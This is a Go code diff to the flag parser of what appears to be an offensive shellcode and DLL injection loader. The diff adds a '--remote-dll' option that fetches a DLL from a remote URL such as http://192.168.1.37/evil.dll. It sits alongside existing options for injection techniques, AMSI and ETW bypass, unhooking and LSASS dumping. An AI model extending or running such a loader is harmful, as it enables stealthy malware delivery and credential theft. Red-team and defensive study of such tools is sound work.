@@ -10,10 +10,11 @@ import (
   "flag"
 )
 
-func ParseFlags() (string, string, string, string, bool, bool, int, bool, bool, bool, bool, bool, string) {
+func ParseFlags() (string, string, string, string, string, bool, bool, int, bool, bool, bool, bool, bool, string) {
   var sc_url string
   var sc_file string
   var dll_file string
+  var dll_url string
   var technique string
   var hook_detect bool
   var halos bool
@@ -26,7 +27,8 @@ func ParseFlags() (string, string, string, string, bool, bool, int, bool, bool, 
   var lsass_flag string
   //var pid int
 
-  flag.StringVar(&sc_url, "url", "", "remote shellcode url (e.g. http://192.168.1.37/shellcode.bin)")
+  flag.StringVar(&sc_url, "url", "", "remote url where shellcode is stored (e.g. http://192.168.1.37/shellcode.bin)")
+  flag.StringVar(&dll_url, "remote-dll", "", "remote url where DLL is stored, especify function separated by comma (i.e. http://192.168.1.37/evil.dll,xyz)")
   flag.StringVar(&sc_file, "file", "", "path to file where shellcode is stored")
   flag.StringVar(&dll_file, "dll", "", "path to DLL you want to inject with function name sepparated by comma (i.e. evil.dll,xyz)")
   flag.StringVar(&technique, "t", "", "shellcode injection technique: CreateRemoteThread, Fibers, CreateProcess, EarlyBirdApc, UuidFromString (default: random)")
@@ -42,7 +44,7 @@ func ParseFlags() (string, string, string, string, bool, bool, int, bool, bool, 
   //flag.IntVar(&pid, "pid", 0, "PID to inject shellcode")
   flag.Parse()
 
-  return sc_url, sc_file, dll_file, technique, hook_detect, halos, unhook, base64_flag, hex_flag, test_flag, amsi, etw, lsass_flag // Return all param values
+  return sc_url, sc_file, dll_file, dll_url, technique, hook_detect, halos, unhook, base64_flag, hex_flag, test_flag, amsi, etw, lsass_flag // Return all param values
 }
 
 
